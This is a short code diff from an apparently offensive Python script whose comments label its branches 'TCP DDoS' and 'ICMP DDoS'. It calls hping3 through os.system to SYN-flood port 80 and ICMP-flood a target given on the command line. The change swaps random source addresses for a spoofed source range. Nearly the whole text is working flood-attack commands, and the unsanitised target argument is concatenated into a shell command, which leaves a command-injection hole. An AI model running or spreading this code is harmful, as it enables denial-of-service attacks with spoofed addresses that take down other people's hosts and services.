@@ -48,7 +48,7 @@ if __name__ == "__main__":
 
     # hping3 for TCP DDoS
     if TCP_DDoS:
-        os.system('hping3 -c 10000 -d 120 -S -w 64 -p 80 --faster --rand-source ' + sys.argv[1])
+        os.system('hping3 -c 10000 -d 120 -S -w 64 -p 80 --faster -a 192.168.0.0/24 ' + sys.argv[1])
     # hping3 for ICMP DDoS
     if ICMP_DDoS:
         os.system('hping3 -V -1 -d 1400 --faster ' + sys.argv[1])
